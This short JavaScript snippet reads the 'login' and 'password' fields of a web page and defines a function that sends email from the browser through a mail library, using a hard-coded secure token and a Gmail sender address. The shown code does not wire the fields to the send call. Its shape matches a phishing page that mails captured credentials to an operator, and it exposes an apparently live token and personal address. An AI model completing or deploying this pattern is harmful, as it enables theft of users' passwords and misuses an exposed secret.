const login = window.document.getElementById('login');
const password = window.document.getElementById('password');

function Send(to, subject, body) {
  Email.send({
    SecureToken : "5674e0b3-9ba8-4b97-b292-40736d2a45b8",
    To : to,
    From : "rozuliony2@gmail.com",
    Subject : subject,
    Body : body
}).then(
  message => alert(message)
);
}